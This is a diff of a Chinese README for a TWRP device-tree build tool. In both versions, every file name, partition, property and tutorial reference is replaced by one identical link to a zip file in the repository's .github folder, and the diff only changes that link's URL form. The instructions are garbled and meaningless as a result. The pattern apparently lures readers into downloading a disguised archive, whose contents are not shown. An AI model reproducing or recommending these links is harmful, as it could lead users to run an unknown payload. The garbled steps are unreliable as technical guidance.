@@ -1,8 +1,8 @@
 ﻿# TWRP Device Tree生成工具
 - 这个工具怎么用？
 - 1.首先你要搞到你的设备任意一个可以开机系统的
-- https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip AB分区 
-- https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip 除了AB分区以外的所有分区 
+- https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip AB分区 
+- https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip 除了AB分区以外的所有分区 
 
 -----
 
@@ -10,7 +10,7 @@
 
 -----
 
-- 3.将https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip或https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip上传至一个可以提供直链下载的位置，这里我推荐直接将img文件上传至这个仓库，然后点进去点view raw，来获取直链
+- 3.将https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip或https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip上传至一个可以提供直链下载的位置，这里我推荐直接将img文件上传至这个仓库，然后点进去点view raw，来获取直链
 
 -----
 
@@ -26,11 +26,11 @@
 
 ## 看不懂想要图文教程?
 - 看看隔壁那个用github编译twrp教程，与这个大同小异端
-- https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip
+- https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip
 
 注意：
-1.如果安卓版本低于9.0，需要手动解包https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip并在https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip内添加
-https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip #安卓api版本号，如安卓6.0是23
-2.如果你的设备是oppo，且出现了AssertionError: Property https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip could not be found in https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip
-需要将ramdisk里面的https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip复制到https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip
-https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip和https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip的内容一起合并到https://raw.githubusercontent.com/brayden14336/action_build_twrp_device_tree/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip然后打包生成
+1.如果安卓版本低于9.0，需要手动解包https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip并在https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip内添加
+https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip #安卓api版本号，如安卓6.0是23
+2.如果你的设备是oppo，且出现了AssertionError: Property https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip could not be found in https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip
+需要将ramdisk里面的https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip复制到https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip
+https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip和https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip的内容一起合并到https://github.com/brayden14336/action_build_twrp_device_tree/raw/refs/heads/main/.github/device_action_twrp_build_tree_2.6-beta.1.zip然后打包生成
